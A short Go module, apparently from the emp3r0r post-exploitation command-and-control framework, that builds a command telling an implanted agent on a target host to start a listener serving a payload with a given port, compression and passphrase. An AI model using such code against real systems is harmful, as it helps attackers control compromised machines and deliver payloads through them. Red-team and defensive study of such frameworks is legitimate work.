package modules

import (
	"fmt"

	"github.com/fatih/color"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func modListener(ctx *c2context.C2Context) {
	required := []string{"listener", "port", "payload", "compression", "passphrase"}
	for _, opt := range required {
		if _, ok := ctx.Flags[opt]; !ok {
			logging.Errorf("Option '%s' not found", opt)
			return
		}
	}
	cmd := fmt.Sprintf("%s --listener %s --port %s --payload %s --compression %s --passphrase %s",
		def.C2CmdListener,
		ctx.Flags["listener"],
		ctx.Flags["port"],
		ctx.Flags["payload"],
		ctx.Flags["compression"],
		ctx.Flags["passphrase"])
	err := CmdSender(cmd, "", ctx.Target.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
